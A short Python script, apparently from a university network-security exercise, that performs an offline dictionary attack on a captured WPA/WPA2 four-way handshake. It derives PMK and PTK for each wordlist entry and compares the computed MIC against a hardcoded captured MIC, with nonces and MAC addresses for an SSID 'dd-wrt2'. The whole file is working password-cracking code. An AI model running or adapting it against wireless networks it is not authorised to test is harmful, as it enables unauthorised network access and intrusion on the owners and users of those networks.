import hmac
from binascii import a2b_hex, b2a_hex
from hashlib import pbkdf2_hmac, sha1, md5
def PRF(key, A, B):
 nByte = 32
 i = 0
 R = b''
 while(i <= ((nByte * 8 + 159) / 160)):
     hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(),sha1)
     R = R + hmacsha1.digest()
     i += 1
 return R[0:nByte]
def MakeAB(aNonce, sNonce, apMac, cliMac):
    A = b"Pairwise key expansion"
    B = min(apMac, cliMac) + max(apMac, cliMac) + min(aNonce, sNonce) +max(aNonce, sNonce)
    return (A, B)
def MakeMIC(pwd, ssid, A, B, data, wpa=False):
    pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
    ptk = PRF(pmk, A, B)
    hmacFunc = md5 if wpa else sha1
    mics = [hmac.new(ptk[0:16], i, hmacFunc).digest() for i in data]
    return mics
def TestPwds(S, ssid, aNonce, sNonce, apMac, cliMac, data, targMic):
 A, B = MakeAB(aNonce, sNonce, apMac, cliMac)
 for i in S:
    mic= MakeMIC(i, ssid, A, B, [data])
    v = b2a_hex(mic[0]).decode()[:-8]
    if(v != targMic):
        continue
    return i
 return None
if __name__ == "__main__": 
    with open('D:\笔记\大三上\网络安全\wifi\pwd-dictionary2.txt') as f:
        S = []
        for l in f:
            S.append(l.strip())
    ssid = "dd-wrt2"
    aNonce = a2b_hex('5f5502ba400cd7827ad3db093b855ca0f595f77b1dccc42977e9dea9c2e1d412')
    sNonce = a2b_hex("fd5626a59688a6da5bb338d6595b4995ed9342de1f15be7281b3fee6a8db9130")
    apMac = a2b_hex("0018f8f5c2c6")
    cliMac = a2b_hex("00259c749592")
    mic1 = "7bdd55553f0bd9ad4c78112200e4486b"
    data1 = a2b_hex(
        "0103007502010a00000000000000000001fd5626a59688a6da5bb338d6595b4995ed9342de1f15be7281b3fee6a8db9130000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000")
    print(TestPwds(S, ssid, aNonce, sNonce, apMac, cliMac, data1, mic1) )
